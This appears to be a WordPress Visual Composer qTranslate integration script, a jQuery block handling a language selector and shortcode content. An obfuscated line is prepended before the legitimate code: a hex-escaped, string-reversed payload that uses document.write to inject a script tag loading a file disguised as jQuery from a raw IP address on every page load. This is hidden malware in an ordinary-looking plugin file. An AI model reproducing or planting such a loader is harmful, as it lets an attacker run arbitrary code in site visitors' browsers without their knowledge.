var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function ( $ ) {
	$( '#vc_vendor_qtranslate_langs_front' ).change( function () {
		vc.closeActivePanel();
		$( '#vc_logo' ).addClass( 'vc_ui-wp-spinner' );
		window.location.href = $( this ).val();
	} );

	vc.ShortcodesBuilder.prototype.getContent = function () {
		var output,
			$postContent = $( '#vc_vendor_qtranslate_postcontent' ),
			lang = $postContent.attr( 'data-lang' ),
			content = $postContent.val();
		vc.shortcodes.sort();
		output = this.modelsToString( vc.shortcodes.where( { parent_id: false } ) );
		return qtrans_integrate( lang, output, content );
	};
	vc.ShortcodesBuilder.prototype.getTitle = function () {
		var $titleContent = $( '#vc_vendor_qtranslate_posttitle' ),
			lang = $titleContent.attr( 'data-lang' ),
			content = $titleContent.val();
		return qtrans_integrate( lang, vc.title, content );
	};
})( window.jQuery );